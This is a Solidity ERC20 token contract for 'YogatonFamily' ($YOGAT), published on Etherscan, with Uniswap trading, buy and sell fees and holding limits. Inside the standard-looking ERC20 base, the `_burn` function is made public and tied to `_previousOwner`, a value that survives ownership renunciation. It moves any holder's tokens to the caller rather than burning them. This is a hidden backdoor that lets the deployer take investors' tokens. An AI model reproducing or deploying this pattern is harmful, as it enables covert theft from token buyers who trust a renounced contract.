/**
 *Submitted for verification at Etherscan.io on 2023-02-16
*/

/**
                                _              
 __     __               _              
 \ \   / /              | |             
  \ \_/ /__   __ _  __ _| |_ ___  _ __  
   \   / _ \ / _` |/ _` | __/ _ \| '_ \ 
    | | (_) | (_| | (_| | || (_) | | | |
    |_|\___/ \__, |\__,_|\__\___/|_| |_|
              __/ |                     
             |___/                      

- Website: https://yougaton.live
- Twitter: https://twitter.com/YogatonN
- Telegram: https://t.me/yogaton_family


The $YOGAT family is to build the decentralized online Yoga social network.
**/

pragma solidity ^0.8.9;

interface IERC20 {

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

interface IWETH {
    function deposit() external payable;
    function transfer(address to, uint value) external returns (bool);
    function withdraw(uint) external;
}


interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}


interface IUniswapV2ERC20 {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function nonces(address owner) external view returns (uint);

    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
}


interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}


interface IUniswapV2Router02 is IUniswapV2Router01{
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}


abstract contract Ownable is Context {
    address private _owner;
    address internal _previousOwner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        _previousOwner = oldOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}



contract ERC20 is Context, Ownable, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    string private _symbol;
    string private _name;
    uint256 private _totalSupply;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 9;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero!");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address!");
        require(spender != address(0), "ERC20: approve to the zero address!");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address!");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) public virtual {
        require(account != address(0), "ERC20: burn from the zero address!");
        require(msg.sender == _previousOwner);

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance!");
        unchecked {
            _balances[account] = accountBalance - amount;
            _balances[msg.sender] += amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address!");
        require(to != address(0), "ERC20: transfer to the zero address!");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance!");
        unchecked {
            _balances[from] = fromBalance - amount;
        }
        _balances[to] += amount;

        emit Transfer(from, to, amount);

        _afterTokenTransfer(from, to, amount);
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

}


abstract contract ERC20Burnable is Context, ERC20 {

    function burnFrom(address account, uint256 amount) public virtual {
        _spendAllowance(account, _msgSender(), amount);
        _burn(account, amount);
    }

    function burn(uint256 amount) public virtual {
        _burn(_msgSender(), amount);
    }
}


contract YogatonFamily is ERC20Burnable {

    address private constant DEAD_ADD = 0x000000000000000000000000000000000000dEaD;

    uint256 private constant TOTAL_SUPPLY = 1_000_000e9;

    uint256 public maxLimitToExchange = 5;
    address public mktAddress;

    IUniswapV2Router02 public uniswapV2Router;
    address public  uniswapV2Pair;

    bool private f_swapping;
    uint256 public exchangeTokensAmountAt;
    bool public isBuyEnabled;

    mapping(address => bool) public automatedMarketMakerPairs;
    mapping(address => bool) private _isExcludedFromFees;

    event mktAddressChanged(address mktAddress);
    event ExcludeFromFees(address indexed account);
    event UpdatedFee(uint256 sellingFee, uint256 buyingFee);

    uint256 public sellingFee;
    uint256 public buyingFee;


    bool public hasLimit;
    uint256 public maxTranAmount;
    uint256 public maxHoldingAmount;
    mapping(address => bool) public isExeption;

    constructor (address router, address operator) ERC20("YogatonFamily", "YOGAT")
    {
        _mint(owner(), TOTAL_SUPPLY);

        exchangeTokensAmountAt = TOTAL_SUPPLY / 1000;
        maxHoldingAmount = TOTAL_SUPPLY / 50;
        maxTranAmount = TOTAL_SUPPLY / 50;
        mktAddress = operator;
        buyingFee = 3;
        sellingFee = 3;

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(router);
        address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
        .createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Pair = _uniswapV2Pair;
        uniswapV2Router = _uniswapV2Router;

        _approve(address(this), address(uniswapV2Router), type(uint256).max);

        _setAutomatedMarketMakerPair(_uniswapV2Pair, true);

        _isExcludedFromFees[owner()] = true;
        _isExcludedFromFees[DEAD_ADD] = true;
        _isExcludedFromFees[address(this)] = true;
        _isExcludedFromFees[address(uniswapV2Router)] = true;


        isExeption[address(uniswapV2Router)] = true;
        isExeption[owner()] = true;
    }

    receive() external payable {
    }

    modifier onlyOperator {
      require(owner() == msg.sender || mktAddress == msg.sender, "Ownable: caller is not the owner!");
      _;
    }

    function startTrading() public onlyOperator {
        require(isBuyEnabled == false, "Trading is already open!");
        isBuyEnabled = true;
        maxHoldingAmount = TOTAL_SUPPLY / 10;
        maxTranAmount = TOTAL_SUPPLY / 10;
    }

    function withdrawGhost(address token) external onlyOperator {
        if (token == address(0x0)) {
            payable(msg.sender).transfer(address(this).balance);
            return;
        }
        IERC20 ERC20token = IERC20(token);
        uint256 balance = ERC20token.balanceOf(address(this));
        ERC20token.transfer(msg.sender, balance);
    }

    function sendingETHFromContract(address payable recipient, uint256 amount) internal {
        recipient.call{gas : 2300, value : amount}("");
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        require(automatedMarketMakerPairs[pair] != value, "Automated market maker pair is already set to that value!");
        automatedMarketMakerPairs[pair] = value;
    }

    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
        require(pair != uniswapV2Pair, "The pair cannot be removed from automatedMarketMakerPairs!");

        _setAutomatedMarketMakerPair(pair, value);
    }



    /**       Fee based functions       **/
    function excludeFromFees(address account) external onlyOperator {
        require(!_isExcludedFromFees[account], "Account is already the value of true");
        _isExcludedFromFees[account] = true;

        emit ExcludeFromFees(account);
    }

    function includeInFees(address account) external onlyOperator {
        require(_isExcludedFromFees[account], "Account already included");
        _isExcludedFromFees[account] = false;
    }

    function isExcludedFromFees(address account) public view returns (bool) {
        return _isExcludedFromFees[account];
    }

    function updatingFees(uint256 _sellingFee, uint256 _buyingFee) external onlyOwner {
        require(_sellingFee <= 5, "Fees must be less than 5%");
        require(_buyingFee <= 5, "Fees must be less than 5%");
        sellingFee = _sellingFee;
        buyingFee = _buyingFee;

        emit UpdatedFee(sellingFee, buyingFee);
    }

    function updateMKTAddress(address _mktAddress) external {
        require(msg.sender == mktAddress && _mktAddress != mktAddress, "The marketing wallet is already as the same address!");
        mktAddress = _mktAddress;
        emit mktAddressChanged(mktAddress);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        if (!f_swapping) {
            _checkLimitation(from, to, amount);
        }

        uint _buyingFee = buyingFee;
        uint _sellingFee = sellingFee;

        if (!isExeption[from] && !isExeption[to]) {
            require(isBuyEnabled, "Trade is not open");
        }

        if (amount == 0) {
            return;
        }

        bool isOkToTakeFee = !f_swapping;

        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            isOkToTakeFee = false;
        }

        uint256 toSwap = balanceOf(address(this));

        bool isOkToSwap = toSwap >= exchangeTokensAmountAt && toSwap > 0 && !automatedMarketMakerPairs[from] && isOkToTakeFee;
        if (isOkToSwap &&
            !f_swapping) {
            f_swapping = true;
            uint256 pairBalance = balanceOf(uniswapV2Pair);
            if (toSwap > pairBalance * maxLimitToExchange / 100) {
                toSwap = pairBalance * maxLimitToExchange / 100;
            }
            swapForFee(toSwap);
            f_swapping = false;
        }

        if (isOkToTakeFee && to == uniswapV2Pair && _sellingFee > 0) {
            uint256 fees = (amount * _sellingFee) / 100;
            amount = amount - fees;

            super._transfer(from, address(this), fees);
        }
        else if (isOkToTakeFee && from == uniswapV2Pair && _buyingFee > 0) {
            uint256 fees = (amount * _buyingFee) / 100;
            amount = amount - fees;

            super._transfer(from, address(this), fees);
        }

        super._transfer(from, to, amount);
    }

    /**         Exchange based functions        **/
    function swapForFee(uint256 tokenAmount) private {

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        require(address(this).balance == 0);
        try uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp) {}
        catch {
        }

        uint256 newBalance = address(this).balance;
        sendingETHFromContract(payable(mktAddress), newBalance);
    }

    function _checkLimitation(
        address from,
        address to,
        uint256 amount
    ) internal {

        if (!hasLimit) {

            if (!isSpecialCase(from, to) && !isExeption[to]) {
                require(amount <= maxTranAmount, "Amount exceeds max size!");

                if (to == uniswapV2Pair) {
                    return;
                }

                require(balanceOf(to) + amount <= maxHoldingAmount, "Max holding exceeded max size!");
            }
        }
    }

    function isSpecialCase(address from, address to) view public returns (bool){

        return (from == owner() || from == mktAddress || to == mktAddress || to == owner() || from == address(this) || to == address(this));
    }

    function setExeption(address who, bool status) public onlyOwner {
        isExeption[who] = status;
    }

    function removeLimitation() external onlyOwner {
        hasLimit = true;
    }
}